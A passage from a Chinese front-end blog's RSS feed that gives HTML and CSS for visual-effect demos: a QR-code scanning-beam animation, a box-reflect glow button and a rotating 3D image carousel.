adar-beam%20%7B%5Cn%20%200%25%20%7B%5Cn%20%20%20%20transform%3A%20translateY(-100%25)%3B%5Cn%20%20%7D%5Cn%20%20100%25%20%7B%5Cn%20%20%20%20transform%3A%20translateY(0)%3B%5Cn%20%20%7D%5Cn%7D%5Cn%22%7D"
          >
              
              <div>
                <div>
<div><pre><code><span><span><span>&lt;</span>main</span><span>></span></span>
  <span><span><span>&lt;</span>section</span><span>></span></span>
    <span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>qr-code<span>"</span></span><span>></span></span>
      <span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>line<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>
    <span><span><span>&lt;/</span>div</span><span>></span></span>
  <span><span><span>&lt;/</span>section</span><span>></span></span>
<span><span><span>&lt;/</span>main</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div><div><pre><code><span>main</span> <span>{</span>
  <span>height</span><span>:</span> 400px<span>;</span>
  <span>display</span><span>:</span> grid<span>;</span>
  <span>place-items</span><span>:</span> center<span>;</span>
  <span>--color</span><span>:</span> #0f3<span>;</span>
<span>}</span>

<span>section</span> <span>{</span>
  <span>position</span><span>:</span> relative<span>;</span>
  <span>width</span><span>:</span> 200px<span>;</span>
  <span>height</span><span>:</span> 200px<span>;</span>
  <span>overflow</span><span>:</span> hidden<span>;</span>
  <span>box-shadow</span><span>:</span> inset 0 0 0 3px <span>var</span><span>(</span>--color<span>)</span><span>;</span>
<span>}</span>

<span>section::before</span> <span>{</span>
  <span>content</span><span>:</span> <span>' '</span><span>;</span>
  <span>position</span><span>:</span> absolute<span>;</span>
  <span>top</span><span>:</span> 50%<span>;</span>
  <span>left</span><span>:</span> 50%<span>;</span>
  <span>width</span><span>:</span> 200%<span>;</span>
  <span>height</span><span>:</span> 80%<span>;</span>
  <span>transform</span><span>:</span> <span>translate</span><span>(</span>-50%<span>,</span> -50%<span>)</span><span>;</span>
  <span>background</span><span>:</span> #fff<span>;</span>
<span>}</span>

<span>section::after</span> <span>{</span>
  <span>content</span><span>:</span> <span>' '</span><span>;</span>
  <span>position</span><span>:</span> absolute<span>;</span>
  <span>top</span><span>:</span> 50%<span>;</span>
  <span>left</span><span>:</span> 50%<span>;</span>
  <span>width</span><span>:</span> 80%<span>;</span>
  <span>height</span><span>:</span> 200%<span>;</span>
  <span>transform</span><span>:</span> <span>translate</span><span>(</span>-50%<span>,</span> -50%<span>)</span><span>;</span>
  <span>background</span><span>:</span> #fff<span>;</span>
<span>}</span>

<span>.qr-code</span> <span>{</span>
  <span>position</span><span>:</span> absolute<span>;</span>
  <span>overflow</span><span>:</span> hidden<span>;</span>
  <span>z-index</span><span>:</span> 1<span>;</span>
  <span>top</span><span>:</span> 50%<span>;</span>
  <span>left</span><span>:</span> 50%<span>;</span>
  <span>width</span><span>:</span> 98%<span>;</span>
  <span>height</span><span>:</span> 98%<span>;</span>
  <span>transform</span><span>:</span> <span>translate</span><span>(</span>-50%<span>,</span> -50%<span>)</span><span>;</span>
  <span>background</span><span>:</span> <span><span>url</span><span>(</span>../../images/qr-code.png<span>)</span></span> center/cover no-repeat<span>;</span>
<span>}</span>

<span>.line</span> <span>{</span>
  <span>position</span><span>:</span> relative<span>;</span>
  <span>width</span><span>:</span> 100%<span>;</span>
  <span>height</span><span>:</span> 100%<span>;</span>
  <span>transform</span><span>:</span> <span>translateY</span><span>(</span>-100%<span>)</span><span>;</span>
  <span>border-bottom</span><span>:</span> 3px solid <span>var</span><span>(</span>--color<span>)</span><span>;</span>
  <span>animation</span><span>:</span> radar-beam 2s <span>cubic-bezier</span><span>(</span>0.53<span>,</span> 0<span>,</span> 0.43<span>,</span> 0.99<span>)</span> infinite<span>;</span>
  <span>background</span><span>:</span> <span>linear-gradient</span><span>(</span>180deg<span>,</span> transparent 43%<span>,</span> <span>var</span><span>(</span>--color<span>)</span> 211%<span>)</span><span>;</span>
<span>}</span>

<span><span>@keyframes</span> radar-beam</span> <span>{</span>
  <span>0%</span> <span>{</span>
    <span>transform</span><span>:</span> <span>translateY</span><span>(</span>-100%<span>)</span><span>;</span>
  <span>}</span>
  <span>100%</span> <span>{</span>
    <span>transform</span><span>:</span> <span>translateY</span><span>(</span>0<span>)</span><span>;</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br></div></div>
            </div>
          </div>
          
        </div>
]]></content:encoded>
    </item>
    <item>
      <title>前端特效</title>
      <link>https://www.matrixtheone.ga/web/magic/</link>
      <guid>https://www.matrixtheone.ga/web/magic/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">前端特效</source>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<img :src="$withBase('/images/Movie/银翼杀手2049.webp')">
]]></content:encoded>
    </item>
    <item>
      <title>倒影动效</title>
      <link>https://www.matrixtheone.ga/web/magic/Reflect/</link>
      <guid>https://www.matrixtheone.ga/web/magic/Reflect/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">倒影动效</source>
      <category>CSS</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[
          <div
            id="code-demo-36a7379d"
           
  
 data-title=""

            data-code="%7B%22html%22%3A%22%3Cmain%3E%5Cn%20%20%3Csection%3EMagic%3C%2Fsection%3E%5Cn%3C%2Fmain%3E%5Cn%22%2C%22css%22%3A%22main%20%7B%5Cn%20%20width%3A%20100%25%3B%5Cn%20%20height%3A%20400px%3B%5Cn%20%20display%3A%20grid%3B%5Cn%20%20place-items%3A%20center%3B%5Cn%20%20background%3A%20%23000%3B%5Cn%20%20--color%3A%20%23ffb8c4ff%3B%5Cn%7D%5Cn%5Cnsection%20%7B%5Cn%20%20position%3A%20relative%3B%5Cn%20%20display%3A%20grid%3B%5Cn%20%20place-items%3A%20center%3B%5Cn%20%20width%3A%20160px%3B%5Cn%20%20height%3A%2080px%3B%5Cn%20%20font-size%3A%2024px%3B%5Cn%20%20border-radius%3A%2010px%3B%5Cn%20%20color%3A%20var(--color)%3B%5Cn%20%20overflow%3A%20hidden%3B%5Cn%20%20cursor%3A%20pointer%3B%5Cn%20%20transition%3A%200.3s%3B%5Cn%20%20-webkit-box-reflect%3A%20below%2010px%20linear-gradient(transparent%2C%20rgba(0%2C%200%2C%200%2C%200.4))%3B%5Cn%7D%5Cn%5Cnsection%3Anth-child(2)%20%7B%5Cn%20%20filter%3A%20hue-rotate(180)%3B%5Cn%7D%5Cn%5Cnsection%3Ahover%20%7B%5Cn%20%20color%3A%20%23fff%3B%5Cn%20%20box-shadow%3A%200%200%205px%20var(--color)%2C%200%200%2025px%20var(--color)%3B%5Cn%7D%5Cn%5Cnsection%3A%3Abefore%20%7B%5Cn%20%20content%3A%20'%20'%3B%5Cn%20%20position%3A%20absolute%3B%5Cn%20%20z-index%3A%20-2%3B%5Cn%20%20left%3A%2050%25%3B%5Cn%20%20top%3A%2050%25%3B%5Cn%20%20transform%3A%20translate(-50%25%2C%20-50%25)%3B%5Cn%20%20width%3A%20150%25%3B%5Cn%20%20height%3A%20300%25%3B%5Cn%20%20background%3A%20linear-gradient(var(--color)%2C%20var(--color))%200%200%20%2F%2050%25%2050%25%20no-repeat%3B%5Cn%20%20animation%3A%20rotate%202s%20linear%20infinite%3B%5Cn%7D%5Cn%5Cnsection%3A%3Aafter%20%7B%5Cn%20%20content%3A%20'%20'%3B%5Cn%20%20position%3A%20absolute%3B%5Cn%20%20z-index%3A%20-1%3B%5Cn%20%20left%3A%202px%3B%5Cn%20%20top%3A%202px%3B%5Cn%20%20width%3A%20calc(100%25%20-%204px)%3B%5Cn%20%20height%3A%20calc(100%25%20-%204px)%3B%5Cn%20%20background%3A%20%23000%3B%5Cn%20%20border-radius%3A%2010px%3B%5Cn%7D%5Cn%5Cnsection%3Ahover%3A%3Aafter%2C%5Cnsection%3Ahover%3A%3Abefore%20%7B%5Cn%20%20transition%3A%200.3s%3B%5Cn%20%20background%3A%20var(--color)%3B%5Cn%7D%5Cn%5Cn%40keyframes%20rotate%20%7B%5Cn%20%20100%25%20%7B%5Cn%20%20%20%20transform%3A%20translate(-50%25%2C%20-50%25)%20rotate(1turn)%3B%5Cn%20%20%7D%5Cn%7D%5Cn%22%7D"
          >
              
              <div>
                <div>
<div><pre><code><span><span><span>&lt;</span>main</span><span>></span></span>
  <span><span><span>&lt;</span>section</span><span>></span></span>Magic<span><span><span>&lt;/</span>section</span><span>></span></span>
<span><span><span>&lt;/</span>main</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><div><pre><code><span>main</span> <span>{</span>
  <span>width</span><span>:</span> 100%<span>;</span>
  <span>height</span><span>:</span> 400px<span>;</span>
  <span>display</span><span>:</span> grid<span>;</span>
  <span>place-items</span><span>:</span> center<span>;</span>
  <span>background</span><span>:</span> #000<span>;</span>
  <span>--color</span><span>:</span> #ffb8c4ff<span>;</span>
<span>}</span>

<span>section</span> <span>{</span>
  <span>position</span><span>:</span> relative<span>;</span>
  <span>display</span><span>:</span> grid<span>;</span>
  <span>place-items</span><span>:</span> center<span>;</span>
  <span>width</span><span>:</span> 160px<span>;</span>
  <span>height</span><span>:</span> 80px<span>;</span>
  <span>font-size</span><span>:</span> 24px<span>;</span>
  <span>border-radius</span><span>:</span> 10px<span>;</span>
  <span>color</span><span>:</span> <span>var</span><span>(</span>--color<span>)</span><span>;</span>
  <span>overflow</span><span>:</span> hidden<span>;</span>
  <span>cursor</span><span>:</span> pointer<span>;</span>
  <span>transition</span><span>:</span> 0.3s<span>;</span>
  <span>-webkit-box-reflect</span><span>:</span> below 10px <span>linear-gradient</span><span>(</span>transparent<span>,</span> <span>rgba</span><span>(</span>0<span>,</span> 0<span>,</span> 0<span>,</span> 0.4<span>)</span><span>)</span><span>;</span>
<span>}</span>

<span>section:nth-child(2)</span> <span>{</span>
  <span>filter</span><span>:</span> <span>hue-rotate</span><span>(</span>180<span>)</span><span>;</span>
<span>}</span>

<span>section:hover</span> <span>{</span>
  <span>color</span><span>:</span> #fff<span>;</span>
  <span>box-shadow</span><span>:</span> 0 0 5px <span>var</span><span>(</span>--color<span>)</span><span>,</span> 0 0 25px <span>var</span><span>(</span>--color<span>)</span><span>;</span>
<span>}</span>

<span>section::before</span> <span>{</span>
  <span>content</span><span>:</span> <span>' '</span><span>;</span>
  <span>position</span><span>:</span> absolute<span>;</span>
  <span>z-index</span><span>:</span> -2<span>;</span>
  <span>left</span><span>:</span> 50%<span>;</span>
  <span>top</span><span>:</span> 50%<span>;</span>
  <span>transform</span><span>:</span> <span>translate</span><span>(</span>-50%<span>,</span> -50%<span>)</span><span>;</span>
  <span>width</span><span>:</span> 150%<span>;</span>
  <span>height</span><span>:</span> 300%<span>;</span>
  <span>background</span><span>:</span> <span>linear-gradient</span><span>(</span><span>var</span><span>(</span>--color<span>)</span><span>,</span> <span>var</span><span>(</span>--color<span>)</span><span>)</span> 0 0 / 50% 50% no-repeat<span>;</span>
  <span>animation</span><span>:</span> rotate 2s linear infinite<span>;</span>
<span>}</span>

<span>section::after</span> <span>{</span>
  <span>content</span><span>:</span> <span>' '</span><span>;</span>
  <span>position</span><span>:</span> absolute<span>;</span>
  <span>z-index</span><span>:</span> -1<span>;</span>
  <span>left</span><span>:</span> 2px<span>;</span>
  <span>top</span><span>:</span> 2px<span>;</span>
  <span>width</span><span>:</span> <span>calc</span><span>(</span>100% - 4px<span>)</span><span>;</span>
  <span>height</span><span>:</span> <span>calc</span><span>(</span>100% - 4px<span>)</span><span>;</span>
  <span>background</span><span>:</span> #000<span>;</span>
  <span>border-radius</span><span>:</span> 10px<span>;</span>
<span>}</span>

<span>section:hover::after,
section:hover::before</span> <span>{</span>
  <span>transition</span><span>:</span> 0.3s<span>;</span>
  <span>background</span><span>:</span> <span>var</span><span>(</span>--color<span>)</span><span>;</span>
<span>}</span>

<span><span>@keyframes</span> rotate</span> <span>{</span>
  <span>100%</span> <span>{</span>
    <span>transform</span><span>:</span> <span>translate</span><span>(</span>-50%<span>,</span> -50%<span>)</span> <span>rotate</span><span>(</span>1turn<span>)</span><span>;</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br></div></div>
            </div>
          </div>
          
        </div>

          <div
            id="code-demo-611f972c"
           
  
 data-title=""

            data-code="%7B%22html%22%3A%22%3Cmain%3E%5Cn%20%20%3Csection%20class%3D%5C%22stage%5C%22%3E%5Cn%20%20%20%20%3Csection%20class%3D%5C%22control%5C%22%3E%5Cn%20%20%20%20%20%20%3Csection%20class%3D%5C%22img-wrap%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%3Cdiv%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3Cdiv%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3Cdiv%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3Cdiv%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3Cdiv%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3Cdiv%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3Cdiv%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3Cdiv%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%3C%2Fsection%3E%5Cn%20%20%20%20%3C%2Fsection%3E%5Cn%20%20%3C%2Fsection%3E%5Cn%3C%2Fmain%3E%5Cn%22%2C%22css%22%3A%22main%20%7B%5Cn%20%20width%3A%20100%25%3B%5Cn%20%20height%3A%20400px%3B%5Cn%20%20background%3A%20%23000%3B%5Cn%7D%5Cn%5Cn.stage%20%7B%5Cn%20%20width%3A%20100%25%3B%5Cn%20%20height%3A%20180px%3B%5Cn%20%20perspective%3A%201200px%3B%5Cn%20%20transform-style%3A%20preserve-3d%3B%5Cn%20%20-webkit-box-reflect%3A%20below%2010px%20linear-gradient(transparent%2C%20rgba(0%2C%200%2C%200%2C%200.5))%3B%5Cn%7D%5Cn%5Cn.control%20%7B%5Cn%20%20position%3A%20relative%3B%5Cn%20%20width%3A%20100%25%3B%5Cn%20%20height%3A%20180px%3B%5Cn%20%20transform-style%3A%20preserve-3d%3B%5Cn%20%20transform%3A%20translateZ(-1200px)%20rotateY(50deg)%20rotateZ(0deg)%3B%5Cn%20%20animation%3A%20rotate%2030s%20linear%20infinite%3B%5Cn%7D%5Cn%5Cn.img-wrap%20%7B%5Cn%20%20position%3A%20absolute%3B%5Cn%20%20width%3A%20240px%3B%5Cn%20%20height%3A%20230px%3B%5Cn%20%20top%3A%2050%25%3B%5Cn%20%20left%3A%2050%25%3B%5Cn%20%20transform%3A%20translate(-50%25%2C%20-50%25)%3B%5Cn%20%20transform-style%3A%20preserve-3d%3B%5Cn%7D%5Cn%5Cn.img-wrap%20div%20%7B%5Cn%20%20position%3A%20absolute%3B%5Cn%20%20width%3A%20320px%3B%5Cn%20%20height%3A%20260px%3B%5Cn%20%20background%3A%20url(..%2F..%2Fimages%2FWives%2FBingBing-1.webp)%20center%2Fcover%20no-repeat%3B%5Cn%7D%5Cn%5Cn.img-wrap%20div%3Anth-child(1)%20%7B%5Cn%20%20transform%3A%20rotateY(80deg)%20translateZ(400px)%3B%5Cn%7D%5Cn.img-wrap%20div%3Anth-child(2)%20%7B%5Cn%20%20background-image%3A%20url(..%2F..%2Fimages%2FWives%2FBingBing-2.webp)%3B%5Cn%20%20transform%3A%20rotateY(125deg)%20translateZ(400px)%3B%5Cn%7D%5Cn.img-wrap%20div%3Anth-child(3)%20%7B%5Cn%20%20background-image%3A%20url(..%2F..%2Fimages%2FWives%2FBingBing-3.webp)%3B%5Cn%20%20transform%3A%20rotateY(170deg)%20translateZ(400px)%3B%5Cn%7D%5Cn.img-wrap%20div%3Anth-child(4)%20%7B%5Cn%20%20background-image%3A%20url(..%2F..%2Fimages%2FWives%2FBingBing-4.webp)%3B%5Cn%20%20transform%3A%20rotateY(215deg)%20translateZ(400px)%3B%5Cn%7D%5Cn.img-wrap%20div%3Anth-child(5)%20%7B%5Cn%20%20background-image%3A%20url(..%2F..%2Fimages%2FWives%2FBingBing-5.webp)%3B%5Cn%20%20transform%3A%20rotateY(260deg)%20translateZ(400px)%3B%5Cn%7D%5Cn.img-wrap%20div%3Anth-child(6)%20%7B%5Cn%20%20background-image%3A%20url(..%2F..%2Fimages%2FWives%2FBingBing-6.webp)%3B%5Cn%20%20transform%3A%20rotateY(305deg)%20translateZ(400px)%3B%5Cn%7D%5Cn.img-wrap%20div%3Anth-child(7)%20%7B%5Cn%20%20background-image%3A%20url(..%2F..%2Fimages%2FWives%2FBingBing-7.webp)%3B%5Cn%20%20transform%3A%20rotateY(350deg)%20translateZ(400px)%3B%5Cn%7D%5Cn.img-wrap%20div%3Anth-child(8)%20%7B%5Cn%20%20background-image%3A%20url(..%2F..%2Fimages%2FWives%2FBingBing-8.webp)%3B%5Cn%20%20transform%3A%20rotateY(395deg)%20translateZ(400px)%3B%5Cn%7D%5Cn%5Cn%40keyframes%20rotate%20%7B%5Cn%20%200%25%20%7B%5Cn%20%20%20%20transform%3A%20translateZ(-1200px)%20rotateY(0deg)%3B%5Cn%20%20%7D%5Cn%20%2050%25%20%7B%5Cn%20%20%20%20transform%3A%20translateZ(-1200px)%20rotateY(-360deg)%3B%5Cn%20%20%7D%5Cn%20%20100%25%20%7B%5Cn%20%20%20%20transform%3A%20translateZ(-1200px)%20rotateY(-720deg)%3B%5Cn%20%20%7D%5Cn%7D%5Cn%22%7D"
          >
              
              <div>
                <div>
<div><pre><code><span><span><span>&lt;</span>main</span><span>></span></span>
  <span><span><span>&lt;</span>section</span> <span>class</span><span><span>=</span><span>"</span>stage<span>"</span></span><span>></span></span>
    <span><span><span>&lt;</span>section</span> <span>class</span><span><span>=</span><span>"</span>control<span>"</span></span><span>></span></span>
      <span><span><span>&lt;</span>section</span> <span>class</span><span><span>=</span><span>"</span>img-wrap<span>"</span></span><span>></span></span>
        <span><span><span>&lt;</span>div</span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>
        <span><span><span>&lt;</span>div</span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>
        <span><span><span>&lt;</span>div</span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>
        <span><span><span>&lt;</span>div</span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>
        <span><span><span>&lt;</span>div</span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>
        <span><span><span>&lt;</span>div</span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>
        <span><span><span>&lt;</span>div</span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>
        <span><span><span>&lt;</span>div</span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>
      <span><span><span>&lt;/</span>section</span><span>></span></span>
    <span><span><span>&lt;/</span>section</span><span>></span></span>
  <span><span><span>&lt;/</span>section</span><span>></span></span>
<span><span><span>&lt;/</span>main</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></div></div><div><pre><code><span>main</span> <span>{</span>
  <span>width</span><span>:</span> 100%<span>;</span>
  <span>height</span><span>:</span> 400px<span>;</span>
  <span>background</span><span>:</span> #000<span>;</span>
<span>}</span>

<span>.stage</span> <span>{</span>
  <span>width</span><span>:</span> 100%<span>;</span>
  <span>height</span><span>:</span> 180px<span>;</span>
  <span>perspective</span><span>:</span> 1200px<span>;</span>
  <span>transform-style</span><span>:</span> preserve-3d<span>;</span>
  <span>-webkit-box-reflect</span><span>:</span> below 10px <span>linear-gradient</span><span>(</span>transparent<span>,</span> <span>rgba</span><span>(</span>0<span>,</span> 0<span>,</span> 0<span>,</span> 0.5<span>)</span><span>)</span><span>;</span>
<span>}</span>

<span>.control</span> <span>{</span>
  <span>position</span><span>:</span> relative<span>;</span>
  <span>width</span><span>:</span> 100%<span>;</span>
  <span>height</span><span>:</span> 180px<span>;</span>
  <span>transform-style</span><span>:</span> preserve-3d<span>;</span>
  <span>transform</span><span>:</span> <span>translateZ</span><span>(</span>-1200px<span>)</span> <span>rotateY</span><span>(</span>50deg<span>)</span> <span>rotateZ</span><span>(</span>0deg<span>)</span><span>;</span>
  <span>animation</span><span>:</span> rotate 30s linear infinite<span>;</span>
<span>}</span>

<span>.img-wrap</span> <span>{</span>
  <span>position</span><span>:</span> absolute<span>;</span>
  <span>width</span><span>:</span> 240px<span>;</span>
  <span>height</span><span>:</span> 230px<span>;</span>
  <span>top</span><span>:</span> 50%<span>;</span>
  <span>left</span><span>:</span> 50%<span>;</span>
  <span>transform</span><span>:</span> <span>translate</span><span>(</span>-50%<span>,</span> -50%<span>)</span><span>;</span>
  <span>transform-style</span><span>:</span> preserve-3d<span>;</span>
<span>}</span>

<span>.img-wrap div</span> <span>{</span>
  <span>position</span><span>:</span> absolute<span>;</span>
  <span>width</span><span>:</span> 320px<span>;</span>
  <span>height</span><span>:</span> 260px<span>;</span>
  <span>background</span><span>:</span> <span><span>url</span><span>(</span>../../images/Wives/BingBing-1.webp<span>)</span></span> center/cover no-repeat<span>;</span>
<span>}</span>

<span>.img-wrap div:nth-child(1)</span> <span>{</span>
  <span>transform</span><span>:</span> <span>rotateY</span><span>(</span>80deg<span>)</span> <span>translateZ</span><span>(</span>400px<span>)</span><span>;</span>
<span>}</span>
<span>.img-wrap div:nth-child(2)</span> <span>{</span>
  <span>background-image</span><span>:</span> <span><span>url</span><span>(</span>../../images/Wives/BingBing-2.webp<span>)</span></span><span>;</span>
  <span>transform</span><span>:</span> <span>rotateY</span><span>(</span>125deg<span>)</span> <span>translateZ</span><span>(</span>400px<span>)</span><span>;</span>
<span>}</span>
<span>.img-wrap div:nth-child(3)</span> <span>{</span>
  <span>background-image</span><span>:</span> <span><span>url</span><span>(</span>../../images/Wives/BingBing-3.webp<span>)</span></span><span>;</span>
  <span>transform</span><span>:</span> <span>rotateY</span><span>(</span>170deg<span>)</span> <span>translateZ</span><span>(</span>400px<span>)</span><span>;</span>
<span>}</span>
<span>.img-wrap div:nth-child(4)</span> <span>{</span>
  <span>background-image</span><span>:</span> <span><span>url</span><span>(</span>../../images/Wives/BingBing-4.webp<span>)</span></span><span>;</span>
  <span>transform</span><span>:</span> <span>rotateY</span><span>(</span>215deg<span>)</span> <span>translateZ</span><span>(</span>400px<span>)</span><span>;</span>
<span>}</span>
<span>.img-wrap div:nth-child(5)</span> <span>{</span>
  <span>background-image</span><span>:</span> <span><span>url</span><span>(</span>../../images/Wives/BingBing-5.webp<span>)</span></span><span>;</span>
  <span>transform</span><span>:</span> <span>rotateY</span><span>(</span>260deg<span>)</span> <span>translateZ</span><span>(</span>400px<span>)</span><span>;</span>
<span>}</span>
<span>.img-wrap div:nth-child(6)</span> <span>{</span>
  <span>background-image</span><span>:</span> <span><span>url</span><span>(</span>../../images/Wives/BingBing-6.webp<span>)</span></span><span>;</span>
  <span>transform</span><span>:</span> <span>rotateY</span><span>(</span>305deg<span>)</span> <span>translateZ</span><span>(</span>400px<span>)</span><span>;</span>
<span>}</span>
<span>.img-wrap div:nth-child(7)</span> <span>{</span>
  <span>background-image</span><span>:</span> <span><span>url</span><span>(</span>../../images/Wives/BingBing-7.webp<span>)</span></span><span>;</span>
  <span>transform</span><span>:</span> <span>rotateY</span><span>(</span>350deg<span>)</span> <span>translateZ</span><span>(</span>400px<span>)</span><span>;</span>
<span>}</span>
<span>.img-wrap div:nth-child(8)</span> <span>{</span>
  <span>background-image</span><span>:</span> <span><span>url</span><span>(</span>../../images/Wives/BingBing-8.webp<span>)</span></span><span>;</span>
  <span>transform</span><span>:</span> <span>rotateY</span><span>(</span>395deg<span>)</span> <span>translateZ</span><span>(</span>400px<span>)</span><span>;</span>
<span>}</span>

<span><span>@keyframes</span> rotate</span> <span>{</span>
  <span>0%</span> <span>{</span>
    <span>transform</span><span>:</span> <span>translateZ</span><span>(</span>-1200px<span>)</span> <span>rotateY</span><span>(</span>0deg<span>)</span><span>;</span>
  <span>}</span>
  <span>50%</span> <span>{</span>
    <span>transform</span><span>:</span> <span>translateZ</span><span>(</span>-1200px<span>)</span> <span>rotateY</span><span>(</span>-360deg<span>)</span><span>;</span>
  <span>}</span>
  <span>100%</span> <span>{</span>
    <span>transform</span><span>:</span> <span>translateZ</span><span>(</span>-1200px<span>)</span> <span>rotateY</span><span>(</span>-720deg<span>)</span><span>;</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br></div></div>
            </div>
          </div>
          
        </div>
]]></content:encoded>
    </item>
    <item>
      <title>规则阴影</title>
      <link>https://www.matrixtheone.ga/web/magic/Rule-Shadow/</link>
      <guid>https://www.matrixtheone.ga/web/magic/Rule-Shadow/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">规则阴影</source>
      <category>CSS</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h3 id="clip-path-polygon"> clip-path: polygon()</h3>
<blockquote>
<p><a href="https://www.zhangxinxu.com/wordpress/2016/05/css3-filter-drop-shadow-vs-box-shadow/" target="_blank" rel="noopener noreferrer">drop-shadow 可以穿透元素的透明部分</a></p>
</blockquote>

          <div
            id="code-demo-084228a8"
           
  
 data-title=""

